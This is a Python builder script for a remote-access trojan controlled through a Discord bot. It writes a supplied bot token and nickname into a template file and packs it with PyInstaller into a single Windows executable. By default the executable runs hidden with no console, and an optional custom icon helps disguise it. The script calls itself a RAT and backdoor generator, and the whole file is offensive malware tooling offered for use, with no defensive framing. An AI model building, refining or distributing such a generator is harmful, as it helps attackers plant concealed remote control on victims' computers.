# This program makes an executable RAT trojan file
import argparse
import PyInstaller.__main__
import os, shutil

original_file_bytes = b''

def replace_arguments(token, bot_name):
	global original_file_bytes

	original_file_bytes = open('prototype.py', 'r').read()
	fbytes = original_file_bytes.replace('<tokenhere>', token)
	fbytes = fbytes.replace('<nicknamehere>', bot_name)

	open('prototype.py', 'w').write(fbytes)

def revert_file():
	open('prototype.py', 'w').write(original_file_bytes)

def retrieve_executable(file_name):
	fbytes = open('./dist/prototype.exe', 'rb').read()

	if (file_name[-4:] == '.exe'):
		open(file_name, 'wb').write(fbytes)
		print (f'[*] Generated : {file_name}')
		return

	# use the valid extension
	open(file_name + '.exe', 'wb').write(fbytes)
	print (f'[*] Generated : {file_name}.exe')

def remove_unnecessaries():
	os.remove('prototype.spec')
	shutil.rmtree('__pycache__')
	shutil.rmtree('build')
	shutil.rmtree('dist')

if __name__ == '__main__':
	parser = argparse.ArgumentParser(description="backdoor generator program ")

	# required arguments
	parser.add_argument('token', type=str, help='the token of the Bot (from discord)')
	parser.add_argument('bot_name', type=str, help='nickname of the Bot')
	parser.add_argument('filename', type=str, help='name of the output .exe file')

	# optional arguments
	parser.add_argument('--icon', '-i', type=str, required=False, help='adds icon to the output exe file')
	parser.add_argument('--debug', '-d', action='store_true', help='generates a console app instead of background process')
	parser.set_defaults(debug=False)
	args = parser.parse_args()

	# assign the tokens, nick, etc. to the file
	replace_arguments(args.token, args.bot_name)

	arguments = []
	if (args.icon != None):
		arguments.append(f'--icon {args.icon}')

	if (not args.debug):
		arguments.append('--noconsole')

	# run the pyinstaller app
	PyInstaller.__main__.run(['prototype.py', '--onefile'] + arguments)

	# reverts back the file state
	revert_file()

	print (f'[botinfo] Token used : {args.token}')
	print (f'[botinfo] Nickname used : {args.bot_name}')
	print ('[*] Retrieving executable....')

	retrieve_executable(args.filename)
	remove_unnecessaries()

	print ('[+] Done!')